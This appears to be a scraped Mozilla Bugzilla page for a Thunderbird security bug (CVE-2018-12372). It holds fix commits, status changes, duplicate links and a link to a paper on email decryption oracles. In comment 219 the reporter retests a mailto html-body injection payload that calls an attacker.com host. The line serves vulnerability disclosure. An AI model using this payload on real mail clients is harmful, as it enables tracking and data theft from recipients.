<span class="quote">&gt; I mean TB 52.8.1. Users are waiting for it since 3 weeks.</span >
Ben, sadly your changes here exposed ancient old bugs to the regular HTML forward:
<a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - forwarding multipart/related message inline does not include body, if &lt;html&gt; tag has attribute and View/Message Body As/Simple HTML is used"
   href="/show_bug.cgi?id=313401">Bug 313401</a> and <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - forward inline from Simple HTML view creates blank email if html tag has attribution (typically originating from MS software)"
   href="/show_bug.cgi?id=394322">bug 394322</a>. We got there via <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - Forward Inline fails to include original HTML message text when inline image is present"
   href="/show_bug.cgi?id=1470210">bug 1470210</a>.

So this is certainly NOT ready for prime time use since it destroys inline forwarding of messages received from users using MS software.</pre></div><div class="change-set" id="a19374862_280903"><div class="change" id="aa19374862_280903">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_280903" id="a19374862_280903"><img src="https://secure.gravatar.com/avatar/58211442c4cece862d7a7850637c4edc?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_280903" id="a19374862_280903"><a class="email " href="/user_profile?user_id=280903" > <span class="fna">Al Billings [:abillings - ex-MoCo]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a19374862_280903"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a19374862_280903">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a19374862_280903">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-03 13:29 PDT" data-time="1530649753">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Alias: CVE-2018-12372</div></div></div><div class="change-set" id="a19804891_29811"><div class="change" id="aa19804891_29811">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_29811" id="a19804891_29811"><img src="https://secure.gravatar.com/avatar/20697ca69672a5276f24a34382a1ddbd?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_29811" id="a19804891_29811"><a class="email " href="/user_profile?user_id=29811" > <span class="fna">Wayne Mery (:wsmwk)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a19804891_29811"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a19804891_29811">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a19804891_29811">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-08 12:56 PDT" data-time="1531079782">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Depends on: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED FIXED - Detaching attachments corrupts the main body of the e-mail text"
   href="/show_bug.cgi?id=1473893">1473893</a></div></div></div><div class="change-set" id="c217"><div class="comment" data-id="13470041" data-no="217"
       data-tags="">
    
    <table class="layout-table change-head assignee" id="ch-217" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_176914" id="a19804891_29811"><img src="https://secure.gravatar.com/avatar/5d8a5792e976c4d61a6651fb4e71c84f?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_176914" id="a19804891_29811"><a class="email disabled" href="/user_profile?user_id=176914" > <span class="fna">Jorg K (CEST = GMT+2)</span></a>
</div>
              <span class="user-role">Assignee</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-217"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-217" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c217">Comment 217</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-07-13 13:02 PDT" data-time="1531512173">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-217">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-217" data-comment-id="13470041"><a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr60/rev/5f006e51c11d">https://hg.mozilla.org/releases/comm-esr60/rev/5f006e51c11d</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr60/rev/98a9416eb471">https://hg.mozilla.org/releases/comm-esr60/rev/98a9416eb471</a>
<a rel="nofollow" href="https://hg.mozilla.org/releases/comm-esr60/rev/74d4c8c64c9c">https://hg.mozilla.org/releases/comm-esr60/rev/74d4c8c64c9c</a></pre><div class="activity"><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_61&amp;o1=isnotempty">status-thunderbird61</a>:
          <a href="/buglist.cgi?f1=cf_status_thunderbird_61&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_61&amp;o1=equals&amp;v1=wontfix">wontfix</a></div><div class="change">
          <a href="/buglist.cgi?f1=cf_status_thunderbird_esr60&amp;o1=isnotempty">status-thunderbird_esr60</a>:
          <a href="/buglist.cgi?f1=cf_status_thunderbird_esr60&amp;o1=equals&amp;v1=affected">affected</a> &rarr; <a href="/buglist.cgi?f1=cf_status_thunderbird_esr60&amp;o1=equals&amp;v1=fixed">fixed</a></div></div></div><div class="change-set" id="a23567106_101158"><div class="change" id="aa23567106_101158">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_101158" id="a23567106_101158"><img src="https://secure.gravatar.com/avatar/18eb16a976feb4b40d839c5e9036bc3a?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_101158" id="a23567106_101158"><a class="email " href="/user_profile?user_id=101158" > <span class="fna">Magnus Melin [:mkmelin]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a23567106_101158"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a23567106_101158">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a23567106_101158">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-08-21 01:59 PDT" data-time="1534841997">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Duplicate of this bug: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE"
   href="/show_bug.cgi?id=1420217">1420217</a></div></div></div><div class="change-set" id="c219"><div class="comment" data-id="13696272" data-no="219"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-219" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a23567106_101158"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a23567106_101158"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-219"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-219" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c219">Comment 219</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-10-18 06:43 PDT" data-time="1539870220">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-219">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-219" data-comment-id="13696272">quick update: I re-tested mailto:?html-body=%3Cvideo%20poster%3D%22http%3A%2F%2Fattacker.com%22%3E&quot;&gt; in TB 60.2.1 and it still allows an attacker to escalate into html context -- if not required this `feature' should be disabled.</pre></div><div class="change-set" id="c220"><div class="comment" data-id="13697007" data-no="220"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-220" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a23567106_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a23567106_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-220"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-220" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c220">Comment 220</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2018-10-18 11:11 PDT" data-time="1539886280">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-220">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><pre
        class="comment-text  "
        id="ct-220" data-comment-id="13697007">Jens, can you please file a new bug about this? You can mention it here for reference. Thanks.</pre></div><div class="change-set" id="c221"><div class="comment" data-id="13898189" data-no="221"
       data-tags="">
    
    <table class="layout-table change-head " id="ch-221" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a23567106_101158"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_22599" id="a23567106_101158"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-221"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-221" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c221">Comment 221</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-02-01 07:40 PST" data-time="1549035638">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-221">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-221" data-comment-id="13898189" data-ismarkdown="true" ><p>This shipped 8 months ago. Could we please open this bug up?</p>
</div></div><div class="change-set" id="a37760761_22599"><div class="change" id="aa37760761_22599">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_22599" id="a37760761_22599"><img src="https://secure.gravatar.com/avatar/1a31769c00192ed0a23c3142d6deace0?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_22599" id="a37760761_22599"><a class="email " href="/user_profile?user_id=22599" > <span class="fna">Ben Bucksch (:BenB)</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a37760761_22599"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a37760761_22599">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a37760761_22599">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-02-01 07:40 PST" data-time="1549035652">3 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Duplicate of this bug: <a class="bz_bug_link
          bz_status_RESOLVED bz_closed"
   title="RESOLVED DUPLICATE - HTML Attachment display affects base message"
   href="/show_bug.cgi?id=107035">107035</a></div></div></div><div class="change-set" id="c223"><div class="comment" data-id="14062539" data-no="223"
       data-tags="">
    
    <table class="layout-table change-head reporter" id="ch-223" role="presentation">
      <tr>
          <td rowspan="2" class="change-gravatar"><div class="vcard vcard_588172" id="a37760761_22599"><img src="https://secure.gravatar.com/avatar/7f3a7a857e94b4dfe1317452a3591feb?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
          </td>

          <td class="change-author"><div class="vcard vcard_588172" id="a37760761_22599"><a class="email " href="/user_profile?user_id=588172" > <span class="fna">Jens Müller</span></a>
</div>
              <span class="user-role">Reporter</span>
          </td>

        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="cs-223"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>

      <tr id="cr-223" >
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#c223">Comment 223</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2019-04-18 06:40 PDT" data-time="1555594842">3 years ago</span>
          </div>
        </td>
      </tr>

      <tr id="ctag-223">
        <td colspan="2" class="comment-tags">
        </td>
      </tr>
    </table>

    
  </div><div
        class="comment-text markdown-body "
        id="ct-223" data-comment-id="14062539" data-ismarkdown="true" ><p>Update: Here&#39;s a full (public) report on reply-based <code>decryption oracles</code> and <code>signature oracles</code> (<a class="bz_bug_link
          bz_status_RESOLVED bz_closed" href="/show_bug.cgi?id=1530106" title="RESOLVED FIXED - Signing Oracle based on keeping CSS styles in replies to HTML emails">bug #1530106</a>):<br>
<a href="https://arxiv.org/ftp/arxiv/papers/1904/1904.07550.pdf" rel="nofollow">https://arxiv.org/ftp/arxiv/papers/1904/1904.07550.pdf</a></p>
</div></div><div class="change-set" id="a70627105_1689"><div class="change" id="aa70627105_1689">
    <table class="layout-table change-head " role="presentation">
      <tr>
        <td rowspan="2" class="change-gravatar"><div class="vcard vcard_1689" id="a70627105_1689"><img src="https://secure.gravatar.com/avatar/da6b54ad3fdb36ba7656df9adfe65d12?d=mm&size=64" class="gravatar" width="32" height="32">
</div>
        </td>
        <td class="change-author"><div class="vcard vcard_1689" id="a70627105_1689"><a class="email " href="/user_profile?user_id=1689" > <span class="fna">Daniel Veditz [:dveditz]</span></a>
</div>
        </td>
        <td rowspan="2" class="comment-actions"><div role="group">
          <button type="button" class="change-spinner minor iconic" id="as-a70627105_1689"
                  aria-label="Collapse" aria-expanded="true"
                  data-strings='{ "collapse_label": "Collapse", "expand_label": "Expanded" }'>
            <span class="icon" aria-hidden="true"></span>
          </button>
        </div></td>
      </tr>
      <tr id="ar-a70627105_1689">
        <td>
          <h3 class="change-name">
            <a href="/show_bug.cgi?id=1419417#a70627105_1689">Updated</a>
          </h3>
          &bull;
          <div class="change-time"><span class="rel-time" title="2020-02-16 17:13 PST" data-time="1581901996">2 years ago</span>
          </div>
        </td>
      </tr>
    </table>
  </div><div class="activity"><div class="change">Group: <span class="activity-deleted">core-security-release</span></div></div></div><div id="new-comment-notice">
          You need to <a href="/show_bug.cgi?id=1419417&amp;GoAheadAndLogIn=1">log in</a>
          before you can comment on or make changes to this bug.
        </div>



<div id="bottom-actions">
  <div id="bottom-right-actions">
    <button type="button" id="top-btn" class="secondary" aria-label="Go to Page Top">Top &uarr;</button>
  </div>
</div></div> 
</main> 
</div> 


</body>
</html>